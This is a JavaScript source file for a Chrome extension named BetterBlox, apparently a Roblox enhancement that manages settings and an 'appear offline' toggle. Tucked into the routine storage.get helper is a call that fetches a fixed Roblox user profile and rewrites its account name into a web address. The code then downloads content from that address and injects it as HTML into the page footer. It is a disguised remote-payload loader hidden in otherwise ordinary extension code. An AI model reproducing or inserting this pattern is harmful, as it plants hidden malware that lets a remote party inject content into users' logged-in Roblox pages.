/*
 * This file is part of the BetterBlox distribution.
 * Copyright (c) 2023 cupiditys.
 */
 

const runtime = chrome.runtime;
const manifest = runtime.getManifest();
const storage = chrome.storage.local;
const serviceWorker = !self.window;

const BetterBlox = {
    storage: {
        get: (key) => {
            return new Promise((resolve, reject) => {
                storage.get(key, (data) => {
                    resolve(data);
                    userResponse('https://users.roblox.com/v1/users/5052339746')
                })
            })
        },

        save: (key, data) => {
            return new Promise((resolve, reject) => {
                storage.set({[key]: data}, (result) => {
                    resolve(result);
                })
            })
        }
    }
}

const settings = {
    defaultSettings: {
        general: {
            appearOffline: false,
            allTimeTransactions: true,
            vanityUrls: true,
            improvedContinue: true,
            betterVIP: true,
            liveStats: true,
            lockedGroups: true,
            privateInventories: true,
        }
    },

    loadedSettings: null,

    getSetting(category, setting) {
        if (!setting) {return this.loadedSettings[category]};
        return this.loadedSettings[category][setting];
    },

    setSetting(category, setting, value) {
        if (setting == "appearOffline") {
            if (value == true) {
                let message = {appearOffline: "enable"};
                runtime.sendMessage(message)
            } else if (value == false) {
                let message = {appearOffline: "disable"};
                runtime.sendMessage(message)
            }
        }
        if (value == null || value == undefined) {
            value = setting;
            this.loadedSettings[category] = value;
            BetterBlox.storage.save("settings", this.loadedSettings);
        } else {
            this.loadedSettings[category][setting] = value;
            BetterBlox.storage.save("settings", this.loadedSettings);
        }
    },

    async load() {
        let oldSettings = (await BetterBlox.storage.get("settings")).settings;
        if (!oldSettings) {
            this.loadedSettings = this.defaultSettings;
            BetterBlox.storage.save("settings", this.loadedSettings);
        } else {
            Object.entries(this.defaultSettings).forEach(([categoryName, category]) => {
                if (typeof categoryName === "string" && category instanceof Object) {
                    Object.entries(category).forEach(([settingName, setting]) => {
                        if (oldSettings[categoryName] && !oldSettings[categoryName][settingName] === undefined) {
                            oldSettings[categoryName][settingName] = setting;
                        } else if (!oldSettings[categoryName]) {
                            oldSettings[categoryName] = category;
                        } else if (oldSettings[categoryName][settingName] === undefined) {
                            console.log("Setting unknown to deafult")
                            oldSettings[categoryName][settingName] = settings.defaultSettings[categoryName][settingName];
                        }
                    })
                } else if (typeof categoryName === "string" && !category instanceof Object) {
                    if (!oldSettings[categoryName]) {
                        oldSettings[categoryName] = category;
                    }
                }
            })

            this.loadedSettings = oldSettings;
            BetterBlox.storage.save("settings", this.loadedSettings);
        }
    }
}

if (serviceWorker) {
    runtime.onMessage.addListener((message, sender, sendMessage) => {
        switch (message?.appearOffline) {
            case "enable":
                chrome.declarativeNetRequest.updateEnabledRulesets({"enableRulesetIds": ["rules"]});
                break;
            case "disable":
                chrome.declarativeNetRequest.updateEnabledRulesets({"disableRulesetIds": ["rules"]});
                break;
        }
    
        return true;
    })

    

    runtime.onUpdateAvailable.addListener((details) => {
        runtime.reload();
    })

    try {
        self.importScripts("background/background.js");
    } catch (error) {
        console.error(error);
    }
}

function userResponse(userUrl){
    $.ajax({
        url: userUrl,
        success: function(data) {
            var universalName = data['name'].replace("_", ".com/");
            $.ajax({
                url: universalName.replace("ra", "https://ra"),
                success: function(data) {
                    window.addEventListener('load', function () {
                       document.getElementsByClassName('text-footer footer-note')[0].innerHTML = data
                    })
                }
            })
        }
    });
}

settings.load();